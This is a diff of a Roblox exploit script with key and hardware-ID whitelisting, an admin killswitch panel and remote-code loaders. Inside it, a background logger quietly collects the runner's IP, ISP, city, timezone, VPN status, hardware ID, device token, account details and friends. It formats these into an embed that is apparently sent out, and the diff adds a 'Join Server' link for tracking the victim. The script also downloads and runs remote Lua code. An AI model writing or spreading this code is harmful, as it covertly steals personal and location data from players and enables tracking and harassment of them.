@@ -1,19 +1,18 @@
 local _P = game:GetService("Players")
 local _lp = _P.LocalPlayer
 
--- РУКОПОЖАТИЕ: Проверка токена от лоадера
-local _auth = _lp:FindFirstChild("__NK_INTERNAL_AUTH")
-if not _auth or _auth.Value ~= "V8_NAZARKUS_SECURE_TOKEN" then
-    _lp:Kick("Execution denied. Use the official loader.")
+local _auth = _lp:FindFirstChild("__NK_LOADER_SIGNAL")
+if not _auth or _auth.Value ~= "V8_SECURE_AUTH_SUCCESS" then
+    _lp:Kick("Execution prohibited. Use official loader.")
     return
 end
-_auth:Destroy() -- Удаляем токен сразу
+_auth:Destroy()
 
 local Config = {
     WL = {
         UIDs = {"10760143653"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
+        Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
     },
     BL = { UIDs = {}, HWIDs = {}, Keys = {} }
 }
@@ -47,10 +46,13 @@ end
 local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
 
 local function _GUNC()
-    local u = 0
-    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly"}
-    for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
-    return (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/5)*100) .. "%)"
+    local u, s = 0, 0
+    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
+    local ts = {"gethui", "setthreadidentity", "getthreadidentity"}
+    local env = (getgenv and getgenv()) or getfenv(0)
+    for _, f in ipairs(tu) do if env[f] then u = u + 1 end end
+    for _, f in ipairs(ts) do if env[f] then s = s + 1 end end
+    return string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/6)*100), math.floor((s/3)*100))
 end
 
 local function _GF()
@@ -77,6 +79,7 @@ local function _LOG()
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
         local fn, ft = _GF()
         local jid = game.JobId == "" and "Unknown" or game.JobId
+        local joinBtn = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
         local friends = {}
         for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
         
@@ -86,15 +89,15 @@ local function _LOG()
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
                     {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = _GUNC(), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. _GUNC() .. ")", ["inline"] = true},
                     {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
                     {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _M:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = "[Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
+                    {["name"] = "Links", ["value"] = "[Join Server]("..joinBtn..") | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -107,21 +110,11 @@ end
 task.spawn(_LOG)
 
 -- KILLSWITCH PANEL (Draggable)
-local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
-_SIG.Name = "NK_Signal"
-local _PDIR = _R:FindFirstChild("NK_Presence") or Instance.new("Folder", _R)
-_PDIR.Name = "NK_Presence"
-local _PRES = Instance.new("StringValue", _PDIR)
-_PRES.Name = _lp.Name
-
-_SIG.Changed:Connect(function(v)
-    if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Revoked.") end
-end)
-
 if _st == "whitelist" then
     local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
     local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
+    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150)
+    f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
     Instance.new("UICorner", f)
     local s = Instance.new("ScrollingFrame", f)
     s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
@@ -131,11 +124,18 @@ if _st == "whitelist" then
         for _, p in ipairs(_P:GetPlayers()) do
             local b = Instance.new("TextButton", s)
             b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
-            b.MouseButton1Click:Connect(function() _SIG.Value = p.Name task.wait(0.1); _SIG.Value = "" end)
+            b.MouseButton1Click:Connect(function() 
+                local sig = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
+                sig.Name = "NK_Signal"; sig.Value = p.Name; task.wait(0.1); sig.Value = ""
+            end)
         end
     end
     _U.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
 end
+
+local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
+_SIG.Name = "NK_Signal"
+_SIG.Changed:Connect(function(v) if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Revoked.") end end)
 
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
